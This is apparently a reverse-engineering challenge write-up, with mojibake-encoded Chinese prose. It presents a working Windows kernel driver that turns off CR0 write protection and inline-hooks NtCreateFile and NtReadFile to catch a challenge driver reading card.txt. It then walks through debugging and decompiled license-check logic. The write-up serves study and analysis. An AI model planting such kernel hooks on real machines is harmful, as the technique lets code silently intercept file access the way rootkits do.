<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, __VA_ARGS__)</span></span><br><span class="line"><span class="keyword">typedef</span> UINT64 u64;</span><br><span class="line"><span class="keyword">typedef</span> UINT32 u32;</span><br><span class="line"><span class="keyword">typedef</span> UINT16 u16;</span><br><span class="line"><span class="keyword">typedef</span> UINT8  u8;</span><br><span class="line"></span><br><span class="line">u8 mov_jmp_rax1[<span class="number">12</span>] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,	<span class="comment">//mov rax,xxx</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xE0</span>											<span class="comment">//jmp rax</span></span><br><span class="line">&#125;, mov_jmp_rax2[<span class="number">12</span>] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,	<span class="comment">//mov rax,xxx</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xE0</span>											<span class="comment">//jmp rax</span></span><br><span class="line">&#125;, origin1[<span class="number">12</span>] = &#123;</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">&#125;, origin2[<span class="number">12</span>] = &#123;</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">u8* HookAddr1 = <span class="literal">NULL</span>, * HookAddr2 = <span class="literal">NULL</span>, Hooked1 = FALSE, Hooked2 = FALSE;</span><br><span class="line"></span><br><span class="line">KIRQL <span class="title function_">writeProtectOFFx64</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL OldIrql;</span><br><span class="line">    OldIrql = KeRaiseIrqlToDpcLevel();</span><br><span class="line">    __writecr0(__readcr0() &amp; ~<span class="number">0x10000</span>);</span><br><span class="line">    _disable();</span><br><span class="line">    <span class="keyword">return</span> OldIrql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writeProtectONx64</span><span class="params">(KIRQL OldIrql)</span> &#123;</span><br><span class="line">    _enable();</span><br><span class="line">    __writecr0(__readcr0() | <span class="number">0x10000</span>);</span><br><span class="line">    KeLowerIrql(OldIrql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">dohook1</span><span class="params">(u8 HOOK)</span> &#123;</span><br><span class="line">    Hooked1 = HOOK;</span><br><span class="line">    KIRQL irql = writeProtectOFFx64();</span><br><span class="line">    <span class="keyword">if</span> (HookAddr1) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!HOOK) &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(HookAddr1, origin1, <span class="keyword">sizeof</span>(origin1));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(HookAddr1, mov_jmp_rax1, <span class="keyword">sizeof</span>(mov_jmp_rax1));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    writeProtectONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">NTSTATUS <span class="title function_">dohook2</span><span class="params">(u8 HOOK)</span> &#123;</span><br><span class="line">    Hooked2 = HOOK;</span><br><span class="line">    KIRQL irql = writeProtectOFFx64();</span><br><span class="line">    <span class="keyword">if</span> (HookAddr2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!HOOK) &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(HookAddr2, origin2, <span class="keyword">sizeof</span>(origin2));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(HookAddr2, mov_jmp_rax2, <span class="keyword">sizeof</span>(mov_jmp_rax2));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    writeProtectONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(*createfile_ptr)</span><span class="params">(</span></span><br><span class="line"><span class="params">    _Out_ PHANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_ ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">    _In_ PCOBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER AllocationSize,</span></span><br><span class="line"><span class="params">    _In_ ULONG FileAttributes,</span></span><br><span class="line"><span class="params">    _In_ ULONG ShareAccess,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateDisposition,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateOptions,</span></span><br><span class="line"><span class="params">    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG EaLength</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(*readfile_ptr)</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ HANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_opt_ HANDLE Event,</span></span><br><span class="line"><span class="params">    _In_opt_ PIO_APC_ROUTINE ApcRoutine,</span></span><br><span class="line"><span class="params">    _In_opt_ PVOID ApcContext,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _Out_writes_bytes_(Length) PVOID Buffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG Length,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER ByteOffset,</span></span><br><span class="line"><span class="params">    _In_opt_ PULONG Key</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">HANDLE FileHandler = <span class="literal">NULL</span>;</span><br><span class="line">NTSTATUS <span class="title function_">mycreatefile</span><span class="params">(</span></span><br><span class="line"><span class="params">    _Out_ PHANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_ ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">    _In_ PCOBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER AllocationSize,</span></span><br><span class="line"><span class="params">    _In_ ULONG FileAttributes,</span></span><br><span class="line"><span class="params">    _In_ ULONG ShareAccess,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateDisposition,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateOptions,</span></span><br><span class="line"><span class="params">    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG EaLength</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    dohook1(FALSE);</span><br><span class="line">    createfile_ptr createfile = (createfile_ptr)HookAddr1;</span><br><span class="line">    NTSTATUS status = createfile(</span><br><span class="line">        FileHandle,</span><br><span class="line">        DesiredAccess,</span><br><span class="line">        ObjectAttributes,</span><br><span class="line">        IoStatusBlock,</span><br><span class="line">        AllocationSize,</span><br><span class="line">        FileAttributes,</span><br><span class="line">        ShareAccess,</span><br><span class="line">        CreateDisposition,</span><br><span class="line">        CreateOptions,</span><br><span class="line">        EaBuffer,</span><br><span class="line">        EaLength</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (!wcscmp(ObjectAttributes-&gt;ObjectName-&gt;Buffer, <span class="string">L&quot;\\??\\C:\\card.txt&quot;</span>)) &#123;</span><br><span class="line">        kprintf(<span class="string">&quot;Line %d: Reading card.txt detected in NtCreateFile\n&quot;</span>, __LINE__);</span><br><span class="line">        FileHandler = *FileHandle;</span><br><span class="line">    &#125;</span><br><span class="line">    dohook1(TRUE);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">myreadfile</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ HANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_opt_ HANDLE Event,</span></span><br><span class="line"><span class="params">    _In_opt_ PIO_APC_ROUTINE ApcRoutine,</span></span><br><span class="line"><span class="params">    _In_opt_ PVOID ApcContext,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _Out_writes_bytes_(Length) PVOID Buffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG Length,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER ByteOffset,</span></span><br><span class="line"><span class="params">    _In_opt_ PULONG Key</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    dohook2(FALSE);</span><br><span class="line">    readfile_ptr readfile = (readfile_ptr)HookAddr2;</span><br><span class="line">    NTSTATUS status = readfile(</span><br><span class="line">        FileHandle,</span><br><span class="line">        Event,</span><br><span class="line">        ApcRoutine,</span><br><span class="line">        ApcContext,</span><br><span class="line">        IoStatusBlock,</span><br><span class="line">        Buffer,</span><br><span class="line">        Length,</span><br><span class="line">        ByteOffset,</span><br><span class="line">        Key</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (FileHandler &amp;&amp; FileHandler == FileHandle) &#123;</span><br><span class="line">        kprintf(<span class="string">&quot;Line %d: Reading card.txt detected in NtReadFile\n&quot;</span>, __LINE__);</span><br><span class="line">    &#125;</span><br><span class="line">    dohook2(TRUE);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteDevice</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line">    kprintf(<span class="string">&quot;Line %d: Deleting Driver\n&quot;</span>, __LINE__);</span><br><span class="line">    <span class="keyword">if</span> (pDriver-&gt;DeviceObject) &#123;</span><br><span class="line">        UNICODE_STRING DeviceName;</span><br><span class="line">        RtlInitUnicodeString(&amp;DeviceName, SYM);</span><br><span class="line">        IoDeleteSymbolicLink(&amp;DeviceName);</span><br><span class="line">        IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">    &#125;</span><br><span class="line">    kprintf(<span class="string">&quot;Line %d: Driver Deleted\n&quot;</span>, __LINE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line">    kprintf(<span class="string">&quot;Line %d: Unloading Driver\n&quot;</span>, __LINE__);</span><br><span class="line">    <span class="keyword">if</span> (Hooked1) &#123;</span><br><span class="line">        dohook1(FALSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (Hooked2) &#123;</span><br><span class="line">        dohook2(FALSE);</span><br><span class="line">    &#125;</span><br><span class="line">    DeleteDevice(pDriver);</span><br><span class="line">    kprintf(<span class="string">&quot;Line %d: Driver Unloaded\n&quot;</span>, __LINE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PDRIVER_OBJECT DriverObject,</span></span><br><span class="line"><span class="params">    _In_ PUNICODE_STRING RegistryPath</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    kprintf(<span class="string">&quot;Line %d: Driver Loaded, RegistryPath : %S\n&quot;</span>, __LINE__, RegistryPath-&gt;Buffer);</span><br><span class="line">    HookAddr1 = (u64)NtCreateFile;</span><br><span class="line">    HookAddr2 = (u64)NtReadFile;</span><br><span class="line">    kprintf(<span class="string">&quot;Line %d: HookAddr1 : 0x%llx, HookAddr2 : 0x%llx\n&quot;</span>, __LINE__, HookAddr1, HookAddr2);</span><br><span class="line">    <span class="keyword">if</span> (!HookAddr1 || !HookAddr2) &#123;</span><br><span class="line">        kprintf(<span class="string">&quot;Line %d: HookAddr1 or HookAddr2 is NULL\n&quot;</span>, __LINE__);</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(origin1, HookAddr1, <span class="keyword">sizeof</span>(origin1));</span><br><span class="line">    <span class="built_in">memcpy</span>(origin2, HookAddr2, <span class="keyword">sizeof</span>(origin2));</span><br><span class="line">    *((u64*)(mov_jmp_rax1 + <span class="number">2</span>)) = (u64)mycreatefile;</span><br><span class="line">    *((u64*)(mov_jmp_rax2 + <span class="number">2</span>)) = (u64)myreadfile;</span><br><span class="line">    dohook1(TRUE);</span><br><span class="line">    dohook2(TRUE);</span><br><span class="line">    kprintf(<span class="string">&quot;Line %d: Hooked NtCreateFile and NtReadFile\n&quot;</span>, __LINE__);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è‡ªå·±ç¼–å†™çš„inline hookè¦åœ¨è¿›å…¥ç”¨æˆ·å‡½æ•°æ—¶å°±é©¬ä¸Šè¿›è¡Œunhook å¦åˆ™ä¼šé€’å½’è°ƒç”¨è‡ªèº«</p>
<p>ç°åœ¨ å…ˆåŠ è½½è‡ªå·±ç¼–å†™çš„é©±åŠ¨ ç„¶ååŠ è½½é¢˜ç›®é©±åŠ¨å°±èƒ½è®°å½•åˆ°è¯»å–card.txtçš„ç—•è¿¹äº† æ¥ä¸‹æ¥è¦è§£å†³çš„é—®é¢˜å°±æ˜¯å¦‚ä½•åˆ†æé©±åŠ¨è¯»å–ç”¨æˆ·åå’Œå¯†é’¥åçš„è¡Œä¸ºäº† è¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨<code>DbgBreakPoint()</code>æ¥ä¸‹æ–­å¹¶è®©Windbgè¿›è¡Œæ‰˜ç®¡</p>
<h3 id="Windbgæ‰˜ç®¡é©±åŠ¨è®¾ç½®çš„æ–­ç‚¹"><a href="#Windbgæ‰˜ç®¡é©±åŠ¨è®¾ç½®çš„æ–­ç‚¹" class="headerlink" title="Windbgæ‰˜ç®¡é©±åŠ¨è®¾ç½®çš„æ–­ç‚¹"></a>Windbgæ‰˜ç®¡é©±åŠ¨è®¾ç½®çš„æ–­ç‚¹</h3><p>ä¿®æ”¹æˆ‘ä»¬çš„è¯»å–å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">NTSTATUS <span class="title function_">myreadfile</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ HANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_opt_ HANDLE Event,</span></span><br><span class="line"><span class="params">    _In_opt_ PIO_APC_ROUTINE ApcRoutine,</span></span><br><span class="line"><span class="params">    _In_opt_ PVOID ApcContext,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _Out_writes_bytes_(Length) PVOID Buffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG Length,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER ByteOffset,</span></span><br><span class="line"><span class="params">    _In_opt_ PULONG Key</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    dohook2(FALSE);</span><br><span class="line">    readfile_ptr readfile = (readfile_ptr)HookAddr2;</span><br><span class="line">    NTSTATUS status = readfile(</span><br><span class="line">        FileHandle,</span><br><span class="line">        Event,</span><br><span class="line">        ApcRoutine,</span><br><span class="line">        ApcContext,</span><br><span class="line">        IoStatusBlock,</span><br><span class="line">        Buffer,</span><br><span class="line">        Length,</span><br><span class="line">        ByteOffset,</span><br><span class="line">        Key</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (FileHandler &amp;&amp; FileHandler == FileHandle) &#123;</span><br><span class="line">        kprintf(<span class="string">&quot;Line %d: Reading card.txt detected in NtReadFile\n&quot;</span>, __LINE__);</span><br><span class="line">        DbgBreakPoint();</span><br><span class="line">    &#125;</span><br><span class="line">    dohook2(TRUE);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶å½“é©±åŠ¨å†è¯»åˆ°card.txtæ—¶ ç³»ç»Ÿå°±ä¼šæ–­åœ¨<code>DbgBreakPoint()</code>å¤„ å†ç”¨Windbgè¿›è¡ŒåŒæœºè°ƒè¯•å°±èƒ½æ¥ç®¡åˆ°è¿™ä¸ªæ–­ç‚¹:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F04%2F10%2F20250410-222523.png" alt="QQ_1744295119223"></p>
<p>è€Œè¯»å–åˆ°çš„æ–‡ä»¶å†…å®¹åœ¨å˜é‡<code>Buffer(RSP+0x28)</code>ä¸­(è¿™é‡Œçš„card.txtå†…å®¹æ¢æ‰äº† ä¸ºäº†æµ‹è¯•Task2çš„):</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F04%2F10%2F20250410-222828.png" alt="QQ_1744295305760"></p>
<p>ä¸‹ä¸ªç¡¬ä»¶æ–­ç‚¹è·Ÿåˆ°é¢˜ç›®é©±åŠ¨é‡Œ <code>ba r4 0xffffc589a0ece3f0</code> åœ¨bnjä¸­æœç´¢ä¸€ä¸‹å­—èŠ‚ç ç‰¹å¾å®šä½å†…å­˜ä½ç½®:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F04%2F10%2F20250410-223114.png" alt="QQ_1744295470896"></p>
<p>æ¥ä¸‹æ¥å¯ä»¥å…ˆé™æ€åˆ†æä¸€ä¸‹äº† è¿™é‡Œç»§ç»­å¾€ä¸‹è°ƒè¯•ä¸€ä¸‹ä¹Ÿèƒ½çŸ¥é“æ˜¯ä¸ªå¤åˆ¶å‡½æ•° ä¸€è·¯äº¤å‰å¼•ç”¨å‘ä¸Šæ‰¾åˆ°ä¸€ä¸ªçœ‹èµ·æ¥åƒæ˜¯ä¸»é€»è¾‘çš„åœ°æ–¹:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">14000</span>a0f4    <span class="type">int64_t</span> <span class="title function_">sub_14000a0f4</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">14000a0f4    &#123;</span><br><span class="line"><span class="number">14000</span>a0f4        <span class="type">int64_t</span>* from;</span><br><span class="line"><span class="number">14000</span>a100        <span class="title function_">sub_1400054cc</span><span class="params">(&amp;from)</span>;</span><br><span class="line"><span class="number">14000</span>a105        <span class="type">int32_t</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="number">14000</span>a105        </span><br><span class="line"><span class="number">14000</span>a122        <span class="title function_">while</span> <span class="params">((<span class="type">int64_t</span>)count &lt; <span class="number">0x10</span>)</span></span><br><span class="line">14000a122        &#123;</span><br><span class="line"><span class="number">14000</span>a122            *(<span class="type">uint16_t</span>*)(&amp;data_140675e20 + ((<span class="type">int64_t</span>)count &lt;&lt; <span class="number">1</span>)) ^= <span class="number">0xace</span>;</span><br><span class="line"><span class="number">14000</span>a115            count += <span class="number">1</span>;</span><br><span class="line"><span class="number">14000</span>a122        &#125;</span><br><span class="line"><span class="number">14000</span>a122        </span><br><span class="line"><span class="number">14000</span>a17d        <span class="type">void</span>* len;</span><br><span class="line"><span class="number">14000</span>a17d        <span class="type">int32_t</span> result;</span><br><span class="line"><span class="number">14000</span>a17d        <span class="type">int64_t</span> r8;</span><br><span class="line"><span class="number">14000</span>a17d        <span class="type">int64_t</span> r9;</span><br><span class="line"><span class="number">14000</span>a17d        </span><br><span class="line"><span class="number">14000</span>a17d        <span class="title function_">if</span> <span class="params">(j_sub_14000a343(&amp;data_140675e20, &amp;from, r8, r9) &lt; <span class="number">0</span> || !from || !len)</span></span><br><span class="line">14000a2d3            result = <span class="number">0</span>;</span><br><span class="line"><span class="number">14000</span>a17d        <span class="keyword">else</span></span><br><span class="line"><span class="number">14000</span>a17d        &#123;</span><br><span class="line"><span class="number">14000</span>a192            <span class="type">void</span> to;  <span class="comment">// Copy content of card.txt into to</span></span><br><span class="line"><span class="number">14000</span>a192            <span class="title function_">str_copy_</span><span class="params">(&amp;to, from, len)</span>;</span><br><span class="line"><span class="number">14000</span>a192            </span><br><span class="line"><span class="number">14000</span>a1a6            <span class="title function_">if</span> <span class="params">((<span class="type">uint32_t</span>)sub_140009ad8(&amp;to))</span></span><br><span class="line">14000a1a6            &#123;</span><br><span class="line"><span class="number">14000</span>a2ce                <span class="title function_">free</span><span class="params">(&amp;to)</span>;</span><br><span class="line"><span class="number">14000</span>a2d3                result = <span class="number">0</span>;</span><br><span class="line"><span class="number">14000</span>a1a6            &#125;</span><br><span class="line"><span class="number">14000</span>a1a6            <span class="keyword">else</span></span><br><span class="line"><span class="number">14000</span>a1a6            &#123;</span><br><span class="line"><span class="number">14000</span>a1bb                <span class="type">void</span>* pos_0x2d = find(&amp;to, <span class="string">u&quot;-â€¦&quot;</span>, nullptr);</span><br><span class="line"><span class="number">14000</span>a1bb                </span><br><span class="line"><span class="number">14000</span>a1cb                <span class="title function_">if</span> <span class="params">(pos_0x2d == <span class="number">-1</span>)</span></span><br><span class="line">14000a1cb                &#123;</span><br><span class="line"><span class="number">14000</span>a2ce                    <span class="title function_">free</span><span class="params">(&amp;to)</span>;</span><br><span class="line"><span class="number">14000</span>a2d3                    result = <span class="number">0</span>;</span><br><span class="line"><span class="number">14000</span>a1cb                &#125;</span><br><span class="line"><span class="number">14000</span>a1cb                <span class="keyword">else</span></span><br><span class="line"><span class="number">14000</span>a1cb                &#123;</span><br><span class="line"><span class="number">14000</span>a1e6                    <span class="type">void</span> usrname;</span><br><span class="line"><span class="number">14000</span>a1e6                    <span class="title function_">split</span><span class="params">(&amp;to, &amp;usrname, <span class="number">0</span>, pos_0x2d)</span>;</span><br><span class="line"><span class="number">14000</span>a20a                    <span class="type">void</span> password;</span><br><span class="line"><span class="number">14000</span>a20a                    <span class="type">char</span> r11_1 = split(&amp;to, &amp;password, (<span class="type">char</span>*)pos_0x2d + <span class="number">1</span>, -ffffffffffffffff);</span><br><span class="line"><span class="number">14000</span>a217                    <span class="type">int64_t</span>* rax_11 = str_copy__(&amp;password);</span><br><span class="line"><span class="number">14000</span>a22a                    <span class="type">char</span>* var_88;</span><br><span class="line"><span class="number">14000</span>a22a                    <span class="type">int32_t</span> decnum = basen(rax_11, &amp;var_88, <span class="number">0xa</span>, rax_11);</span><br><span class="line"><span class="number">14000</span>a22a                    </span><br><span class="line"><span class="number">14000</span>a23d                    <span class="title function_">if</span> <span class="params">((<span class="type">int32_t</span>)*(<span class="type">uint8_t</span>*)var_88)</span></span><br><span class="line">14000a23d                    &#123;</span><br><span class="line"><span class="number">14000</span>a2b7                        label_14000a2b7:</span><br><span class="line"><span class="number">14000</span>a2b7                        <span class="title function_">free</span><span class="params">(&amp;password)</span>;</span><br><span class="line"><span class="number">14000</span>a2c4                        <span class="title function_">free</span><span class="params">(&amp;usrname)</span>;</span><br><span class="line"><span class="number">14000</span>a2ce                        <span class="title function_">free</span><span class="params">(&amp;to)</span>;</span><br><span class="line"><span class="number">14000</span>a2d3                        result = <span class="number">0</span>;</span><br><span class="line"><span class="number">14000</span>a23d                    &#125;</span><br><span class="line"><span class="number">14000</span>a23d                    <span class="keyword">else</span></span><br><span class="line"><span class="number">14000</span>a23d                    &#123;</span><br><span class="line"><span class="number">14000</span>a247                        <span class="type">int64_t</span> len_1 = lenth(&amp;usrname);</span><br><span class="line"><span class="number">14000</span>a259                        <span class="type">int64_t</span>* usrname_1 = str_copy__(&amp;usrname);</span><br><span class="line"><span class="number">14000</span>a259                        </span><br><span class="line"><span class="number">14000</span>a27e                        <span class="title function_">if</span> <span class="params">(decnum != encrypt(usrname_1, len_1, usrname_1, r11_1))</span></span><br><span class="line">14000a27e                            <span class="keyword">goto</span> label_14000a2b7;</span><br><span class="line"><span class="number">14000</span>a27e                        </span><br><span class="line"><span class="number">14000</span>a28d                        <span class="title function_">free</span><span class="params">(&amp;password)</span>;</span><br><span class="line"><span class="number">14000</span>a29a                        <span class="title function_">free</span><span class="params">(&amp;usrname)</span>;</span><br><span class="line"><span class="number">14000</span>a2a4                        <span class="title function_">free</span><span class="params">(&amp;to)</span>;</span><br><span class="line"><span class="number">14000</span>a2a9                        result = <span class="number">1</span>;</span><br><span class="line"><span class="number">14000</span>a23d                    &#125;</span><br><span class="line"><span class="number">14000</span>a1cb                &#125;</span><br><span class="line"><span class="number">14000</span>a1a6            &#125;</span><br><span class="line"><span class="number">14000</span>a17d        &#125;</span><br><span class="line"><span class="number">14000</span>a17d        </span><br><span class="line"><span class="number">14000</span>a2dc        <span class="keyword">return</span> result;</span><br><span class="line"><span class="number">14000</span>a0f4    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¤§éƒ¨åˆ†éƒ½æ˜¯stringçš„æˆå‘˜å‡½æ•° å¯†é’¥çš„å¤„ç†åªæœ‰ä¸€ä¸ªè½¬åŒ–ä¸º10è¿›åˆ¶æ•° è€Œç”¨æˆ·åçš„æ“ä½œåœ¨encryptä¸­:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">140</span>afc131    <span class="type">uint64_t</span> <span class="title function_">sub_140afc131</span><span class="params">(<span class="type">char</span>* usrname, <span class="type">int64_t</span> len, <span class="type">int16_t</span> end @ rax, <span class="type">char</span> arg4 @ r11)</span></span><br><span class="line"></span><br><span class="line">140afc131    &#123;</span><br><span class="line"><span class="number">140</span>afc131        <span class="type">bool</span> c;</span><br><span class="line"><span class="number">140</span>afc136        end = end + arg4;</span><br><span class="line"><span class="number">140</span>afc15d        <span class="type">int32_t</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="number">140</span>afc165        <span class="type">int32_t</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="number">140</span>afc165        </span><br><span class="line"><span class="number">140</span>afc198        <span class="title function_">while</span> <span class="params">((<span class="type">int64_t</span>)count &lt; len)</span></span><br><span class="line">140afc198        &#123;</span><br><span class="line"><span class="number">140</span>afc198            <span class="type">int64_t</span> now;</span><br><span class="line"><span class="number">140</span>afc1ab            now = usrname[(<span class="type">int64_t</span>)count];</span><br><span class="line"><span class="number">140</span>afc1ae            <span class="type">char</span> var_28_1 = now;</span><br><span class="line"><span class="number">140</span>afc1b1            <span class="type">char</span> temp0_1 = *(<span class="type">uint8_t</span>*)((<span class="type">char</span>*)now)[<span class="number">1</span>];</span><br><span class="line"><span class="number">140</span>afc1b1            *(<span class="type">uint8_t</span>*)((<span class="type">char</span>*)now)[<span class="number">1</span>] = *(<span class="type">uint8_t</span>*)((<span class="type">char</span>*)now)[<span class="number">1</span>];</span><br><span class="line"><span class="number">140</span>afc1b1            *(<span class="type">uint8_t</span>*)((<span class="type">char</span>*)now)[<span class="number">1</span>] = temp0_1;</span><br><span class="line"><span class="number">140</span>afc1cf            res = ((<span class="type">uint32_t</span>)var_28_1 + res) * <span class="number">0x1003f</span>;</span><br><span class="line"><span class="number">140</span>afc17d            count += <span class="number">1</span>;</span><br><span class="line"><span class="number">140</span>afc198        &#125;</span><br><span class="line"><span class="number">140</span>afc198        </span><br><span class="line"><span class="number">140</span>afc1f3        <span class="title function_">return</span> <span class="params">(<span class="type">uint64_t</span>)</span>res;</span><br><span class="line"><span class="number">140</span>afc131    &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªç±»ä¼¼CRC32çš„æ ¡éªŒå’Œè®¡ç®— åˆ°è¿™é‡ŒTask1&amp;2å°±èƒ½è½»æ¾å®Œæˆäº†</p>
